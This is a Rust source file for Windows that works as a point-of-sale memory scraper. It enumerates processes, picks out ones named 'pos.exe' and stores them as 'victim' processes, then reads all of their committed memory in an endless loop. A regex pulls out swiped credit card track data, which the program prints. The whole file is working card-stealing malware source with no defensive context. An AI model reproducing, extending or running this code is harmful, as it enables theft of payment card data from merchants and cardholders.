use regex::Regex;
use std::borrow::Borrow;
use std::collections::HashSet;
use std::{io, mem};
use std::mem::MaybeUninit;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{FALSE, DWORD, HMODULE, LPVOID};
use winapi::shared::ntdef::HANDLE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{ReadProcessMemory, VirtualQueryEx};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::psapi::{EnumProcesses, EnumProcessModules, GetModuleFileNameExW};
use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};

#[derive(Debug)]
pub struct Process {
    pid: u32,
    name: String,
    handle: HANDLE,
}

impl Process {
    pub fn open(pid: u32) -> io::Result<Self> {
        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid)
        };

        if handle.is_null() {
            return Err(io::Error::last_os_error());
        }

        Ok(Self { 
            pid,
            name: "".to_string(), 
            handle,
        })
    }

    pub fn get_name(&mut self) {
        let mut module = MaybeUninit::<HMODULE>::uninit();
        let module_size = mem::size_of::<HMODULE>() as u32;
        let mut size = 0;

        // SAFETY: validate the pointer
        if unsafe {
            EnumProcessModules(self.handle, module.as_mut_ptr(), module_size, &mut size)
        } == FALSE {
            return eprintln!("{}", io::Error::last_os_error());
        }
        

        let module = unsafe {
            module.assume_init()
        };
        
        let mut buffer = Vec::<u16>::with_capacity(260);

        let length = unsafe {
            GetModuleFileNameExW(self.handle, module, buffer.as_mut_ptr().cast(), buffer.capacity() as u32)
        };

        if length == 0 {
            return println!("{}", io::Error::last_os_error())
        }

        unsafe {
            buffer.set_len(length as usize);
        }

        self.name = String::from_utf16_lossy(&buffer);
    }

    pub fn scan_memory_for_credit_card(&self) -> io::Result<HashSet<String>> {
        // basic example of swiped credit card format
        // https://stackoverflow.com/questions/9658985/credit-card-swiper-format
        let re = Regex::new(r"%B\d{16}\^[a-zA-Z]{3}/[a-zA-Z]{4} [a-zA-Z]{1}\^\d{4}").unwrap();
        let mut card_matches = HashSet::new();

        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let mut address: usize = 0;
    
        while unsafe {
            VirtualQueryEx(self.handle, address as *const _, &mut mbi, std::mem::size_of::<MEMORY_BASIC_INFORMATION>())
        } != 0 {
            if mbi.State == winapi::um::winnt::MEM_COMMIT {
                let mut buffer: Vec<u8> = vec![0; mbi.RegionSize as usize];
                let mut bytes_read: SIZE_T = 0;

                unsafe {
                    ReadProcessMemory(self.handle, mbi.BaseAddress, buffer.as_mut_ptr() as LPVOID, mbi.RegionSize, &mut bytes_read);
                };
    
                let s = String::from_utf8_lossy(&buffer[..bytes_read]);
                
                for m in re.find_iter(s.borrow()).filter_map(|m| Some(m.as_str().to_string())) {
                    card_matches.insert(m);
                }
            }
    
            // Move to the next region
            address += mbi.RegionSize as usize;
        }


    Ok(card_matches)
    }
}

impl Drop for Process {
    fn drop(&mut self) {
        unsafe {
            // handle result here
            let _ = CloseHandle(self.handle);
        }
    }
}

pub fn enumerate_processes() -> io::Result<Vec<u32>> {
    let mut pids = Vec::<DWORD>::with_capacity(1024);
    let mut size = 0;
    
    if unsafe {
        EnumProcesses(pids.as_mut_ptr(), (pids.capacity() * mem::size_of::<u32>()) as u32, & mut size)
    } == FALSE {
        return Err(io::Error::last_os_error());
    }

    let count = size as usize / mem::size_of::<DWORD>();
    unsafe {
        pids.set_len(count);
    }

    Ok(pids)
}

// https://lonami.dev/blog/woce-1/
// https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/index.html
// 7:23 https://www.youtube.com/watch?v=gOJWkM1YhsA
// https://users.rust-lang.org/t/help-with-getmodulefilenameexa-lpbasename-parameter/112799
// https://github.com/joren485/RamScraper/blob/master/Ramscraper.py
// https://stackoverflow.com/questions/54573814/read-the-whole-process-memory-into-a-buffer-in-c
#[cfg(target_os = "windows")]
fn main() {
    let pids = enumerate_processes().unwrap();

    let mut victim_processes: Vec<Process> = Vec::new();
    for pid in pids {
        let proc_result = Process::open(pid);
        let Ok(mut proc) = proc_result else {
            eprintln!("failed to open pid: {pid}");
            continue;
        };

        proc.get_name();
        println!("opened pid: {}: {}", pid, proc.name);
        
        if proc.name.contains("pos.exe") {//if proc.name.contains("MSRX.exe") {
            victim_processes.push(proc);
        }
    }

    println!("{:?}", victim_processes);
    
    loop {
        for proc in &victim_processes {
            match proc.scan_memory_for_credit_card() {
                Ok(data) => println!("{:?}", data),
                Err(e) => eprintln!("{}", e)
            }
        }
    }
}